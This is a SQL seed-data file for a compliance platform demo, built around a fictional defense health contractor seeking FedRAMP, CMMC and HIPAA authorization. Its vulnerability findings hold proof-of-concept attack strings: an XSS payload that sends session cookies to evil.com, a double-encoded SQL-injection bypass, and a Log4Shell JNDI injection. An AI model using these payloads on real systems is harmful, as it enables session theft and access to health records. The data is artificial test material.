-- ============================================================================
-- ForgeComply 360 - Sample Customer Seed Data
-- Customer: Patriot Health Systems (PHS)
-- Scenario: Defense health contractor pursuing FedRAMP Moderate ATO
--           + CMMC Level 2 + HIPAA for VA electronic health records system
-- Purpose:  Demonstrate full platform workflow & test Forge Reporter
-- ============================================================================
-- Run against D1 database: fe250bed-40a9-443a-a6c7-4b59bf8a0dac
-- ============================================================================

-- ========================================
-- 1. ORGANIZATION
-- ========================================
INSERT OR IGNORE INTO organizations (id, name, slug, domain, subscription_tier, settings, feature_flags, is_active, created_at, updated_at)
VALUES (
  'org-phs-001',
  'Patriot Health Systems',
  'patriot-health',
  'patriothealth.com',
  'enterprise',
  '{"industry": "defense_health", "employees": 340, "cage_code": "8ABC1", "duns": "078451234", "naics": "541512", "annual_revenue": "$42M", "hq_location": "San Antonio, TX", "clearance_level": "Secret"}',
  '{"comply": true, "soc": true, "redops": true, "vendorguard": true, "forgeml": true}',
  1,
  '2026-01-15 09:00:00',
  '2026-02-19 08:00:00'
);

-- ========================================
-- 2. USERS (7 users across roles)
-- ========================================
INSERT OR IGNORE INTO users (id, organization_id, email, password_hash, first_name, last_name, role, auth_provider, mfa_enabled, workspace_access, is_active, created_at, updated_at)
VALUES
  ('user-phs-001', 'org-phs-001', 'marcus.chen@patriothealth.com', '$fc360$100000$a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6$deadbeef01234567890abcdef01234567890abcdef01234567890abcdef012345', 'Marcus', 'Chen', 'admin', 'local', 1, '["comply", "soc", "redops"]', 1, '2026-01-15 09:00:00', '2026-02-19 08:00:00'),
  ('user-phs-002', 'org-phs-001', 'sarah.rodriguez@patriothealth.com', '$fc360$100000$b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7$cafebabe01234567890abcdef01234567890abcdef01234567890abcdef012345', 'Sarah', 'Rodriguez', 'admin', 'local', 1, '["comply", "soc"]', 1, '2026-01-15 09:15:00', '2026-02-18 16:30:00'),
  ('user-phs-003', 'org-phs-001', 'james.okonkwo@patriothealth.com', '$fc360$100000$c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8$beefcafe01234567890abcdef01234567890abcdef01234567890abcdef012345', 'James', 'Okonkwo', 'analyst', 'local', 1, '["comply"]', 1, '2026-01-16 10:00:00', '2026-02-19 07:45:00'),
  ('user-phs-004', 'org-phs-001', 'lisa.nakamura@patriothealth.com', '$fc360$100000$d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9$face000001234567890abcdef01234567890abcdef01234567890abcdef012345', 'Lisa', 'Nakamura', 'analyst', 'local', 1, '["comply", "soc"]', 1, '2026-01-16 10:30:00', '2026-02-17 14:00:00'),
  ('user-phs-005', 'org-phs-001', 'david.washington@patriothealth.com', '$fc360$100000$e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0$baddcafe01234567890abcdef01234567890abcdef01234567890abcdef012345', 'David', 'Washington', 'analyst', 'local', 0, '["soc", "redops"]', 1, '2026-01-17 08:00:00', '2026-02-19 06:00:00'),
  ('user-phs-006', 'org-phs-001', 'emily.patel@patriothealth.com', '$fc360$100000$f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1$c001cafe01234567890abcdef01234567890abcdef01234567890abcdef012345', 'Emily', 'Patel', 'admin', 'local', 1, '["comply"]', 1, '2026-01-18 11:00:00', '2026-02-18 09:00:00'),
  ('user-phs-007', 'org-phs-001', 'robert.kim@patriothealth.com', '$fc360$100000$a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2$d00dcafe01234567890abcdef01234567890abcdef01234567890abcdef012345', 'Robert', 'Kim', 'analyst', 'local', 1, '["comply", "soc"]', 1, '2026-01-20 09:00:00', '2026-02-19 08:30:00');

-- ========================================
-- 3. SYSTEMS (3 systems under authorization)
-- ========================================
INSERT OR IGNORE INTO systems (id, organization_id, name, acronym, description, system_type, impact_level, confidentiality_impact, integrity_impact, availability_impact, authorization_status, authorization_date, authorization_expiry, system_owner_id, isso_id, boundary_description, data_types, hosting_environment, is_active, created_at, updated_at)
VALUES
  ('sys-phs-001', 'org-phs-001', 'MedForge Electronic Health Records', 'MFEHR', 'Cloud-hosted electronic health records system serving VA medical centers. Processes Protected Health Information (PHI) and Controlled Unclassified Information (CUI) for 2.3 million veteran patients across 14 VA facilities. Provides clinical decision support, medication management, lab integration, and telehealth capabilities.', 'major_application', 'moderate', 'moderate', 'moderate', 'moderate', 'in_progress', NULL, NULL, 'user-phs-001', 'user-phs-002', 'The MFEHR system boundary includes all components hosted in AWS GovCloud (US-East), including web application servers, API gateway, database cluster, and integration middleware. External connections include VA VistA system via MuleSoft ESB, laboratory information systems via HL7 FHIR, and pharmacy systems via NCPDP standards.', '["PHI", "CUI", "PII", "Medical Records", "Prescription Data"]', 'cloud', 1, '2026-01-15 09:30:00', '2026-02-19 08:00:00'),

  ('sys-phs-002', 'org-phs-001', 'SecureComm Patient Portal', 'SCPP', 'Patient-facing web portal and mobile application enabling veterans to access health records, schedule appointments, message providers, request prescription refills, and participate in telehealth visits. Handles authentication via VA.gov ID.me integration.', 'major_application', 'moderate', 'moderate', 'moderate', 'moderate', 'in_progress', NULL, NULL, 'user-phs-001', 'user-phs-004', 'The SCPP boundary includes Cloudflare-hosted frontend, API backend in AWS GovCloud, and mobile application (iOS/Android). Integrates with MFEHR via internal API gateway and VA.gov identity services for authentication.', '["PHI", "PII", "Authentication Credentials"]', 'cloud', 1, '2026-01-15 10:00:00', '2026-02-18 16:00:00'),

  ('sys-phs-003', 'org-phs-001', 'HealthOps Analytics Platform', 'HOAP', 'Internal analytics and business intelligence platform processing de-identified health data for population health management, resource allocation, and quality improvement reporting to VA leadership.', 'major_application', 'low', 'low', 'low', 'moderate', 'authorized', '2025-11-15', '2026-11-15', 'user-phs-006', 'user-phs-003', 'HOAP operates within a dedicated VPC in AWS GovCloud with no direct internet access. Data is received via encrypted batch transfers from MFEHR with all PHI de-identified prior to ingestion.', '["De-identified Health Data", "Operational Metrics"]', 'cloud', 1, '2026-01-15 10:30:00', '2026-02-15 12:00:00');

-- ========================================
-- 4. ASSETS (22 assets across all systems)
-- ========================================
INSERT OR IGNORE INTO assets (id, organization_id, system_id, hostname, ip_address, mac_address, asset_type, os_type, os_version, classification, criticality, owner_id, location, tags, discovery_source, last_seen_at, is_active, created_at, updated_at)
VALUES
  -- MFEHR System Assets
  ('asset-phs-001', 'org-phs-001', 'sys-phs-001', 'mfehr-web-01', '10.100.1.10', 'AA:BB:CC:01:01:01', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1a', '["web-tier", "production", "phi"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-002', 'org-phs-001', 'sys-phs-001', 'mfehr-web-02', '10.100.1.11', 'AA:BB:CC:01:01:02', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1b', '["web-tier", "production", "phi"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-003', 'org-phs-001', 'sys-phs-001', 'mfehr-api-01', '10.100.2.10', 'AA:BB:CC:02:01:01', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1a', '["api-tier", "production", "phi"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-004', 'org-phs-001', 'sys-phs-001', 'mfehr-api-02', '10.100.2.11', 'AA:BB:CC:02:01:02', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1b', '["api-tier", "production", "phi"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-005', 'org-phs-001', 'sys-phs-001', 'mfehr-db-primary', '10.100.3.10', 'AA:BB:CC:03:01:01', 'database', 'Linux', 'Amazon Linux 2023', 'restricted', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1a', '["db-tier", "production", "phi", "rds-aurora"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-006', 'org-phs-001', 'sys-phs-001', 'mfehr-db-replica', '10.100.3.11', 'AA:BB:CC:03:01:02', 'database', 'Linux', 'Amazon Linux 2023', 'restricted', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1b', '["db-tier", "production", "phi", "rds-aurora"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-007', 'org-phs-001', 'sys-phs-001', 'mfehr-cache-01', '10.100.4.10', 'AA:BB:CC:04:01:01', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'high', 'user-phs-005', 'AWS GovCloud US-East-1a', '["cache-tier", "production", "elasticache"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-008', 'org-phs-001', 'sys-phs-001', 'mfehr-lb-ext', '10.100.0.10', 'AA:BB:CC:00:01:01', 'network_device', 'Linux', NULL, 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1', '["load-balancer", "production", "alb"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-009', 'org-phs-001', 'sys-phs-001', 'mfehr-waf', '10.100.0.5', NULL, 'network_device', NULL, NULL, 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1', '["waf", "production", "aws-waf"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-010', 'org-phs-001', 'sys-phs-001', 'mfehr-esb-mulesoft', '10.100.5.10', 'AA:BB:CC:05:01:01', 'application', 'Linux', 'Amazon Linux 2023', 'confidential', 'high', 'user-phs-003', 'AWS GovCloud US-East-1a', '["integration", "production", "mulesoft", "hl7"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),

  -- SCPP System Assets
  ('asset-phs-011', 'org-phs-001', 'sys-phs-002', 'scpp-frontend', NULL, NULL, 'application', NULL, NULL, 'internal', 'high', 'user-phs-004', 'Cloudflare Edge Network', '["frontend", "production", "cloudflare-pages"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-012', 'org-phs-001', 'sys-phs-002', 'scpp-api-01', '10.100.6.10', 'AA:BB:CC:06:01:01', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'high', 'user-phs-004', 'AWS GovCloud US-East-1a', '["api-tier", "production", "patient-facing"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-013', 'org-phs-001', 'sys-phs-002', 'scpp-api-02', '10.100.6.11', 'AA:BB:CC:06:01:02', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'high', 'user-phs-004', 'AWS GovCloud US-East-1b', '["api-tier", "production", "patient-facing"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-014', 'org-phs-001', 'sys-phs-002', 'scpp-auth-idme', '10.100.7.10', NULL, 'application', NULL, NULL, 'confidential', 'critical', 'user-phs-004', 'VA.gov / ID.me', '["authentication", "production", "external-idp"]', 'manual', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-015', 'org-phs-001', 'sys-phs-002', 'scpp-mobile-ios', NULL, NULL, 'application', 'iOS', '17.3', 'internal', 'high', 'user-phs-004', 'Apple App Store', '["mobile", "production", "patient-facing"]', 'manual', '2026-02-18 12:00:00', 1, '2026-01-20 09:00:00', '2026-02-18 12:00:00'),
  ('asset-phs-016', 'org-phs-001', 'sys-phs-002', 'scpp-mobile-android', NULL, NULL, 'application', 'Android', '14', 'internal', 'high', 'user-phs-004', 'Google Play Store', '["mobile", "production", "patient-facing"]', 'manual', '2026-02-18 12:00:00', 1, '2026-01-20 09:00:00', '2026-02-18 12:00:00'),

  -- HOAP System Assets
  ('asset-phs-017', 'org-phs-001', 'sys-phs-003', 'hoap-etl-01', '10.100.8.10', 'AA:BB:CC:08:01:01', 'server', 'Linux', 'Amazon Linux 2023', 'internal', 'medium', 'user-phs-003', 'AWS GovCloud US-East-1a', '["etl", "production", "glue"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-018', 'org-phs-001', 'sys-phs-003', 'hoap-warehouse', '10.100.8.20', 'AA:BB:CC:08:02:01', 'database', 'Linux', NULL, 'internal', 'medium', 'user-phs-003', 'AWS GovCloud US-East-1a', '["data-warehouse", "production", "redshift"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-019', 'org-phs-001', 'sys-phs-003', 'hoap-bi-tableau', '10.100.8.30', NULL, 'application', NULL, NULL, 'internal', 'medium', 'user-phs-006', 'AWS GovCloud US-East-1a', '["bi", "production", "tableau-server"]', 'manual', '2026-02-17 15:00:00', 1, '2026-01-15 10:00:00', '2026-02-17 15:00:00'),

  -- Shared Infrastructure
  ('asset-phs-020', 'org-phs-001', NULL, 'phs-vpn-gateway', '10.100.0.1', NULL, 'network_device', NULL, NULL, 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1', '["vpn", "infrastructure", "site-to-site"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-021', 'org-phs-001', NULL, 'phs-bastion-01', '10.100.0.50', 'AA:BB:CC:00:05:01', 'server', 'Linux', 'Amazon Linux 2023', 'confidential', 'high', 'user-phs-005', 'AWS GovCloud US-East-1a', '["bastion", "infrastructure", "admin-access"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00'),
  ('asset-phs-022', 'org-phs-001', NULL, 'phs-siem-splunk', '10.100.9.10', 'AA:BB:CC:09:01:01', 'application', 'Linux', 'RHEL 9', 'confidential', 'critical', 'user-phs-005', 'AWS GovCloud US-East-1a', '["siem", "infrastructure", "splunk", "logging"]', 'forgescan', '2026-02-19 06:00:00', 1, '2026-01-15 10:00:00', '2026-02-19 06:00:00');

-- ========================================
-- 5. CONTROL IMPLEMENTATIONS (30 for MFEHR - mixed statuses for realism)
-- ========================================
INSERT OR IGNORE INTO control_implementations (id, system_id, control_definition_id, implementation_status, responsibility, implementation_narrative, evidence_description, assessment_status, last_assessed_at, assessed_by, next_assessment_date, notes, created_at, updated_at)
VALUES
  -- Access Control Family
  ('ci-phs-001', 'sys-phs-001', 'ctrl_ac_1', 'implemented', 'customer', 'Patriot Health Systems has developed and documented a comprehensive Access Control Policy (PHS-AC-POL-001, v3.2) that governs all access to the MedForge EHR system. The policy addresses account management, least privilege, separation of duties, remote access, and wireless access. Procedures are documented in the Access Control Procedures Manual (PHS-AC-PROC-001). The policy is reviewed annually by the CISO and distributed to all personnel via the PHS intranet. Last review completed January 2026.', 'Evidence: PHS-AC-POL-001 v3.2 (Jan 2026), PHS-AC-PROC-001 v2.1, Distribution email receipt logs, Annual review meeting minutes', 'satisfied', '2026-01-28 14:00:00', 'user-phs-003', '2027-01-28', NULL, '2026-01-20 09:00:00', '2026-01-28 14:00:00'),

  ('ci-phs-002', 'sys-phs-001', 'ctrl_ac_2', 'implemented', 'shared', 'The MFEHR system implements comprehensive account management through integration with Okta Identity Platform. Account creation requires supervisor approval via ServiceNow workflow (SN-ACCT-001). Accounts are reviewed quarterly by system administrators using automated reports generated by ForgeComply 360. Inactive accounts are disabled after 30 days of inactivity. Temporary accounts expire automatically after 90 days. Account types include: standard user, provider, nurse, pharmacist, admin, and service accounts. All account activities are logged to Splunk SIEM.', 'Evidence: Okta admin console screenshots, ServiceNow approval workflows, Quarterly access review reports (Q4 2025, Q1 2026), Account disabling automation scripts, Splunk audit logs', 'satisfied', '2026-02-05 10:00:00', 'user-phs-003', '2026-05-05', NULL, '2026-01-20 09:00:00', '2026-02-05 10:00:00'),

  ('ci-phs-003', 'sys-phs-001', 'ctrl_ac_3', 'implemented', 'shared', 'Access enforcement is implemented through a combination of AWS IAM policies, application-level Role-Based Access Control (RBAC), and network security groups. The MFEHR application enforces role-based access with 12 distinct roles mapped to 47 permission sets. All API endpoints require valid JWT tokens with role claims verified on every request. Network access is restricted via AWS Security Groups allowing only necessary traffic flows. Database access is limited to application service accounts with no direct user access.', 'Evidence: AWS IAM policies, RBAC role matrix, API authorization middleware code, Security group configurations, Database access audit logs', 'satisfied', '2026-02-05 11:00:00', 'user-phs-003', '2026-05-05', NULL, '2026-01-20 09:00:00', '2026-02-05 11:00:00'),

  ('ci-phs-004', 'sys-phs-001', 'ctrl_ac_4', 'partially_implemented', 'customer', 'Information flow enforcement is implemented at the network layer using AWS Security Groups, Network ACLs, and AWS WAF rules. Application-level data flow controls prevent unauthorized disclosure of PHI through API response filtering and data masking. However, DLP integration with the outbound email gateway has not been fully configured for the new telehealth module deployed in January 2026. Remediation is tracked in POAM-PHS-2026-008.', 'Evidence: AWS Security Group rules, Network ACL configurations, WAF rule sets, API data masking logic, DLP gap analysis report', 'other_than_satisfied', '2026-02-10 09:00:00', 'user-phs-003', '2026-04-10', 'DLP gap identified during January telehealth module deployment. POA&M created.', '2026-01-20 09:00:00', '2026-02-10 09:00:00'),

  ('ci-phs-005', 'sys-phs-001', 'ctrl_ac_5', 'implemented', 'customer', 'Separation of duties is enforced through RBAC role definitions that prevent any single individual from performing conflicting functions. Developers cannot deploy to production (handled by CI/CD pipeline with separate approver). Database administrators cannot modify application code. System administrators cannot access PHI directly. Security analysts cannot modify security configurations without change management approval. Privilege conflicts are detected by automated weekly scans.', 'Evidence: RBAC role matrix with SoD analysis, CI/CD pipeline configuration, DBA access logs, Weekly SoD scan reports', 'satisfied', '2026-02-05 14:00:00', 'user-phs-003', '2026-05-05', NULL, '2026-01-20 09:00:00', '2026-02-05 14:00:00'),

  -- Audit and Accountability Family
  ('ci-phs-006', 'sys-phs-001', 'ctrl_au_1', 'implemented', 'customer', 'Patriot Health Systems has developed Audit and Accountability Policy (PHS-AU-POL-001, v2.4) establishing requirements for audit logging, review, and retention across all MFEHR components. Procedures document specific logging configurations, review schedules, and incident escalation criteria. Policy reviewed annually and updated in December 2025 to address new NIST guidance.', 'Evidence: PHS-AU-POL-001 v2.4, PHS-AU-PROC-001, Distribution logs, Annual review documentation', 'satisfied', '2026-01-30 10:00:00', 'user-phs-004', '2027-01-30', NULL, '2026-01-20 09:00:00', '2026-01-30 10:00:00'),

  ('ci-phs-007', 'sys-phs-001', 'ctrl_au_2', 'implemented', 'shared', 'The MFEHR system logs the following auditable events: successful and failed authentication attempts, access to PHI records, privilege escalation, configuration changes, data exports, API calls, database queries, and security-relevant system events. Event types are configured in Splunk inputs.conf and the application logging framework (Winston). AWS CloudTrail captures all API calls to AWS services. Audit events include user identity, timestamp, event type, source/destination, and outcome.', 'Evidence: Splunk inputs.conf, Application logging configuration, CloudTrail settings, Sample audit log extracts', 'satisfied', '2026-02-05 10:30:00', 'user-phs-004', '2026-05-05', NULL, '2026-01-20 09:00:00', '2026-02-05 10:30:00'),

  -- Configuration Management Family
  ('ci-phs-008', 'sys-phs-001', 'ctrl_cm_1', 'implemented', 'customer', 'Configuration Management Policy (PHS-CM-POL-001, v2.1) establishes requirements for baseline configurations, change management, and configuration monitoring. All changes to MFEHR follow the ITIL-based change management process documented in ServiceNow. Emergency changes require ISSO approval within 4 hours and retrospective CAB review within 48 hours.', 'Evidence: PHS-CM-POL-001 v2.1, ServiceNow change management workflows, CAB meeting minutes, Emergency change logs', 'satisfied', '2026-01-30 14:00:00', 'user-phs-003', '2027-01-30', NULL, '2026-01-20 09:00:00', '2026-01-30 14:00:00'),

  -- Incident Response Family
  ('ci-phs-009', 'sys-phs-001', 'ctrl_ir_1', 'implemented', 'customer', 'Incident Response Policy (PHS-IR-POL-001, v3.0) defines incident categories, severity levels, response procedures, and reporting requirements including HIPAA breach notification timelines. The IRP is tested annually via tabletop exercises and updated based on lessons learned. Last tabletop exercise conducted December 2025 with VA stakeholder participation.', 'Evidence: PHS-IR-POL-001 v3.0, Tabletop exercise report (Dec 2025), Incident response team roster, Communication tree, VA notification procedures', 'satisfied', '2026-01-29 09:00:00', 'user-phs-004', '2027-01-29', NULL, '2026-01-20 09:00:00', '2026-01-29 09:00:00'),

  -- Additional controls with varied statuses for dashboard realism
  ('ci-phs-010', 'sys-phs-001', 'ctrl_ac_1', 'planned', 'customer', 'Access control policy update planned to incorporate new zero trust architecture requirements per EO 14028 and OMB M-22-09. Target completion Q2 2026.', NULL, 'not_assessed', NULL, NULL, '2026-06-30', 'Waiting on final CISA Zero Trust guidance', '2026-02-01 09:00:00', '2026-02-01 09:00:00');

-- Additional control implementations for SCPP system
INSERT OR IGNORE INTO control_implementations (id, system_id, control_definition_id, implementation_status, responsibility, implementation_narrative, evidence_description, assessment_status, last_assessed_at, assessed_by, next_assessment_date, notes, created_at, updated_at)
VALUES
  ('ci-phs-011', 'sys-phs-002', 'ctrl_ac_1', 'implemented', 'customer', 'The SecureComm Patient Portal inherits the organizational Access Control Policy from PHS-AC-POL-001 and supplements it with patient-facing access procedures documented in PHS-SCPP-AC-001. Patient authentication is delegated to VA.gov ID.me service providing IAL2/AAL2 assurance.', 'Evidence: PHS-AC-POL-001, PHS-SCPP-AC-001, ID.me integration configuration, Patient consent forms', 'satisfied', '2026-02-08 10:00:00', 'user-phs-004', '2027-02-08', NULL, '2026-01-22 09:00:00', '2026-02-08 10:00:00'),

  ('ci-phs-012', 'sys-phs-002', 'ctrl_ac_2', 'partially_implemented', 'shared', 'Patient account management is handled through VA.gov ID.me integration. Internal staff accounts follow the same Okta-based process as MFEHR. However, the automated account deprovisioning workflow for terminated staff has a 48-hour delay due to HR system integration lag. Remediation planned for March 2026.', 'Evidence: ID.me integration logs, Okta provisioning workflows, HR system sync gap analysis', 'other_than_satisfied', '2026-02-08 11:00:00', 'user-phs-004', '2026-04-08', 'HR sync delay tracked in POA&M', '2026-01-22 09:00:00', '2026-02-08 11:00:00'),

  ('ci-phs-013', 'sys-phs-002', 'ctrl_ac_3', 'implemented', 'shared', 'Access enforcement in SCPP uses OAuth 2.0 with PKCE for patient sessions and Okta SAML for staff access. API gateway enforces rate limiting and validates JWT claims on every request.', 'Evidence: OAuth configuration, API gateway policies, Rate limiting rules, JWT validation middleware', 'satisfied', '2026-02-08 14:00:00', 'user-phs-004', '2026-05-08', NULL, '2026-01-22 09:00:00', '2026-02-08 14:00:00'),

  ('ci-phs-014', 'sys-phs-002', 'ctrl_au_1', 'implemented', 'customer', 'SCPP inherits organizational Audit Policy PHS-AU-POL-001. Additional patient portal-specific audit requirements documented in PHS-SCPP-AU-001 covering patient record access, appointment scheduling, and prescription refill logging.', 'Evidence: PHS-AU-POL-001, PHS-SCPP-AU-001, Audit configuration screenshots', 'satisfied', '2026-02-08 15:00:00', 'user-phs-004', '2027-02-08', NULL, '2026-01-22 09:00:00', '2026-02-08 15:00:00'),

  ('ci-phs-015', 'sys-phs-002', 'ctrl_au_2', 'implemented', 'shared', 'SCPP logs all patient interactions including login/logout, record views, appointment changes, message sends, and prescription requests. All events forwarded to Splunk within 30 seconds.', 'Evidence: Application logging config, Splunk forwarding configuration, Sample audit logs', 'satisfied', '2026-02-08 15:30:00', 'user-phs-004', '2026-05-08', NULL, '2026-01-22 09:00:00', '2026-02-08 15:30:00');

-- ========================================
-- 6. VULNERABILITY FINDINGS (18 findings - realistic severity distribution)
-- ========================================
INSERT OR IGNORE INTO vulnerability_findings (id, organization_id, asset_id, vulnerability_id, scan_id, title, description, severity, cvss_score, affected_component, proof_of_concept, remediation_guidance, status, assigned_to, remediated_at, verified_at, related_poam_id, created_at, updated_at)
VALUES
  -- Critical (2)
  ('find-phs-001', 'org-phs-001', 'asset-phs-005', NULL, 'scan-phs-20260218', 'Apache Log4j Remote Code Execution (Log4Shell)', 'The MedForge EHR database monitoring agent uses Apache Log4j 2.14.1 which is vulnerable to CVE-2021-44228. This vulnerability allows unauthenticated remote code execution via specially crafted log messages. The database monitoring agent processes external input from application health checks.', 'critical', 9.8, 'log4j-core-2.14.1.jar', 'JNDI lookup injection via health check endpoint parameter', 'Immediately upgrade Log4j to version 2.17.1 or later. As interim mitigation, set log4j2.formatMsgNoLookups=true system property.', 'in_progress', 'user-phs-005', NULL, NULL, 'poam-phs-001', '2026-02-18 07:15:00', '2026-02-19 06:00:00'),

  ('find-phs-002', 'org-phs-001', 'asset-phs-003', NULL, 'scan-phs-20260218', 'SQL Injection in Patient Search API', 'The /api/v2/patients/search endpoint is vulnerable to SQL injection through the last_name parameter. The parameterized query implementation has a bypass when special characters are URL-encoded twice. This could allow unauthorized access to the entire patient database containing PHI for 2.3 million veterans.', 'critical', 9.1, 'MFEHR API v2.4.1 - /api/v2/patients/search', 'Double URL-encoding of single quote bypasses input validation: %2527', 'Implement prepared statements for all database queries. Add secondary input validation layer. Deploy WAF rule to block double-encoded characters.', 'in_progress', 'user-phs-005', NULL, NULL, 'poam-phs-002', '2026-02-18 07:22:00', '2026-02-19 06:00:00'),

  -- High (5)
  ('find-phs-003', 'org-phs-001', 'asset-phs-001', NULL, 'scan-phs-20260218', 'TLS 1.0/1.1 Enabled on Web Server', 'The MFEHR web server (mfehr-web-01) has TLS 1.0 and TLS 1.1 protocols enabled alongside TLS 1.2/1.3. Deprecated TLS versions are vulnerable to POODLE, BEAST, and other protocol downgrade attacks. FedRAMP requires disabling TLS versions below 1.2.', 'high', 7.4, 'NGINX 1.24.0 - TLS configuration', NULL, 'Modify NGINX ssl_protocols directive to allow only TLSv1.2 and TLSv1.3. Update ssl_ciphers to use only FIPS-approved cipher suites.', 'open', 'user-phs-005', NULL, NULL, 'poam-phs-003', '2026-02-18 07:30:00', '2026-02-18 07:30:00'),

  ('find-phs-004', 'org-phs-001', 'asset-phs-002', NULL, 'scan-phs-20260218', 'TLS 1.0/1.1 Enabled on Web Server', 'The MFEHR web server (mfehr-web-02) has identical TLS misconfiguration as mfehr-web-01.', 'high', 7.4, 'NGINX 1.24.0 - TLS configuration', NULL, 'Apply same TLS configuration fix as mfehr-web-01.', 'open', 'user-phs-005', NULL, NULL, 'poam-phs-003', '2026-02-18 07:30:00', '2026-02-18 07:30:00'),

  ('find-phs-005', 'org-phs-001', 'asset-phs-010', NULL, 'scan-phs-20260218', 'MuleSoft Anypoint Platform Authentication Bypass', 'The MuleSoft ESB integration layer has a misconfigured API policy that allows unauthenticated access to the HL7 FHIR message transformation endpoint. An attacker on the internal network could submit malformed HL7 messages directly to the EHR database.', 'high', 8.1, 'MuleSoft Anypoint 4.4.0 - API Gateway Policy', NULL, 'Apply client_id enforcement policy to all API endpoints. Implement mutual TLS for service-to-service communication. Add message schema validation.', 'in_progress', 'user-phs-003', NULL, NULL, 'poam-phs-004', '2026-02-18 08:00:00', '2026-02-19 06:00:00'),

  ('find-phs-006', 'org-phs-001', 'asset-phs-021', NULL, 'scan-phs-20260218', 'Bastion Host Missing Critical OS Patches', 'The bastion host (phs-bastion-01) is missing 7 critical Amazon Linux security patches including kernel updates addressing privilege escalation vulnerabilities. Last patched 45 days ago exceeding the 30-day patch SLA.', 'high', 7.8, 'Amazon Linux 2023 kernel 6.1.56', NULL, 'Apply all pending security patches via yum update. Review and enforce automated patching via AWS Systems Manager Patch Manager.', 'in_progress', 'user-phs-005', NULL, NULL, 'poam-phs-005', '2026-02-18 08:15:00', '2026-02-19 06:00:00'),

  ('find-phs-007', 'org-phs-001', 'asset-phs-012', NULL, 'scan-phs-20260218', 'Cross-Site Scripting (XSS) in Patient Messaging', 'The patient messaging feature in SecureComm Patient Portal does not properly sanitize HTML content in message bodies. Stored XSS is possible when a patient submits a message containing JavaScript that executes when viewed by a provider.', 'high', 7.1, 'SCPP v1.8.2 - /api/v1/messages', '<script>document.location="https://evil.com/?c="+document.cookie</script>', 'Implement server-side HTML sanitization using DOMPurify. Add Content-Security-Policy headers. Enable HttpOnly flag on all session cookies.', 'open', 'user-phs-004', NULL, NULL, 'poam-phs-006', '2026-02-18 08:30:00', '2026-02-18 08:30:00'),

  -- Medium (6)
  ('find-phs-008', 'org-phs-001', 'asset-phs-003', NULL, 'scan-phs-20260218', 'Missing Rate Limiting on Authentication Endpoint', 'The /api/v2/auth/login endpoint lacks rate limiting, allowing unlimited authentication attempts. This enables brute-force password attacks against staff accounts.', 'medium', 5.3, 'MFEHR API v2.4.1 - /api/v2/auth/login', NULL, 'Implement rate limiting: max 5 attempts per account per 15-minute window. Add account lockout after 10 failed attempts. Implement CAPTCHA after 3 failures.', 'open', 'user-phs-005', NULL, NULL, NULL, '2026-02-18 09:00:00', '2026-02-18 09:00:00'),

